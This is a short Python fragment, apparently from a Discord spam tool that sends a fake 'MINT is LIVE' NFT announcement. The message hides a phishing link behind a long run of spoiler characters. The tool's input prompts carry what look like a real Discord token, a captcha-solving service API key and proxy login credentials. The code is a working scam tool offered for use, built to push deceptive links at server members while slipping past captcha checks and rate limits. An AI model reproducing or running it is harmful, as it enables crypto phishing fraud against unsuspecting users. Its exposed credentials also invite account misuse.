...
message = {"content": "**Hello  <user>  !\n\nMINT is LIVE !\n\nDon't miss the chance to MINT ! :bored stackers:  **||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​|||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| https://boredstackers-mint.netlify.app/"}
...
token = input(f"{Fore.RED}OTg1MzMxNzM1OTI5NzEyNjgy.GqnxlJ.7EX8FsWSMj_BDlWjz_TtWjrmkSkyEz0BRhxlms: {Fore.RESET}")
server_id = input(f"{Fore.RED}948329084151283763: {Fore.RESET}")
message_id = input(f"{Fore.RED}964924413885706300: {Fore.RESET}")
capmonster_apikey = input(f"{Fore.RED}68077f081d3c29bf9ce69f197ab227b1: {Fore.RESET}")
proxy = input(f"{Fore.RED}Proxy (mix101KAW2P9D:bFwCxTI@164.155.148.1:8085): {Fore.RESET}")
